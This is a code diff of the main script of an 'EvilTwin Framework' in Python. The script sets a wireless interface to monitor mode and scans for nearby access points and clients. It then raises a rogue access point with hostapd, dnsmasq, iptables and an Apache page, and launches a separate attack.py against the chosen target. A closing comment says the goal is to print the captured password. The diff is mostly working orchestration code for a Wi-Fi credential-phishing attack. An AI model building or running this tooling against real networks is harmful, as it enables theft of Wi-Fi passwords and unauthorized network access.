@@ -11,11 +11,11 @@ import shlex
 import sys
 from ap_scanner import ap_client_scanner
 
-
+"""
 iphoneaf = '86:78:D0:1f:CF:86'
 onenode = '2E:E4:F0:11:48:B5'
 וubuntu = "98:3B:8F:03:29:0B"
-
+"""
 
 
 def count_file_chars():
@@ -61,11 +61,13 @@ def start_dnsmasq(attack_inet):
 os.system('clear')
 console = Console()
 cprint(figlet_format('Welcome to the EvilTwin Framework!', font='slant'), 'green', attrs=['bold'])
-attack_inet = None
+main_inet = None
 internet_inet = None
+scan_results = None
+virtual_inet = None
 
 # TODO
-ssid = "Shabab"
+# ssid = "Shabab"
 
 while 1:
     user_input = main_menu_io()
@@ -73,30 +75,41 @@ while 1:
         os.system('clear')
         cprint(figlet_format('Goodbye!', font='slant'), 'green')
         exit()
+
+    # Set Network Interface
     elif user_input == "1":
-        
-        # ((mac_addr, ap_name, channel, dbm_signal), chosen_client_mac)
-        attack_inet = attack_inet_set()
-        while attack_inet not in get_if_list() or attack_inet is None:
-            attack_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
+        main_inet = attack_inet_set()
+        while main_inet not in get_if_list() or main_inet is None:
+            main_inet = prompt(f'Please insert correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
         os.system('clear')
-        
-        scan_results = ap_client_scanner(attack_inet)
         internet_inet = internet_inet_set()
-        
-        while internet_inet not in get_if_list() or internet_inet is None or internet_inet == attack_inet:
+        while internet_inet not in get_if_list() or internet_inet is None or internet_inet == main_inet:
             internet_inet = prompt(f'Please another correct interface name from the next list: [{" ".join(get_if_list())}] \n>> ')
-        set_inet_to_monitor(attack_inet)
-        # new_inet = create_new_inet(attack_inet)
-        set_inet_unmanaged(attack_inet)
-        set_netmask(attack_inet)
-        set_iptables(attack_inet, internet_inet)
-        set_hostapd_conf(attack_inet, scan_results[0][1], scan_results[0][2])
+        set_inet_to_monitor(main_inet)
+        set_inet_unmanaged(main_inet)
+        virtual_inet = main_inet + "mon"
+        set_new_virtual_inet(virtual_inet)
+
+    # Network Scan
+    elif user_input == "2":
+        if main_inet is None or internet_inet is None:
+            console.print(f'[bold][red]Error: Cannot initiate an a scan without choosing a capable network interface\n[/][/]')
+            continue
+        # ((mac_addr, ap_name, channel, dbm_signal), chosen_client_mac)
+        scan_results = ap_client_scanner(main_inet)
+
+    elif user_input == "3":
+        if scan_results is None:
+            console.print(f'[bold][red]Error: Cannot initiate an EvilTwin attack without first scannig for potetial targets\n[/][/]')
+            continue
+        set_netmask(main_inet)
+        set_iptables(main_inet, internet_inet)
+        set_hostapd_conf(main_inet, scan_results[0][1], scan_results[0][2])
         set_apache_serv()
         ap = subprocess.Popen(shlex.split('hostapd config/hostapd.conf'))
 
-        subprocess.Popen([sys.executable, 'attack.py', scan_results[0][0], scan_results[1], "wlan1", scan_results[0][2]], start_new_session=True).pid
-        start_dnsmasq(attack_inet)
+        subprocess.Popen([sys.executable, 'attack.py', scan_results[0][0], scan_results[1], virtual_inet, scan_results[0][2]], start_new_session=True).pid
+        start_dnsmasq(main_inet)
         """
         here we need to print the password and stop!!
         """
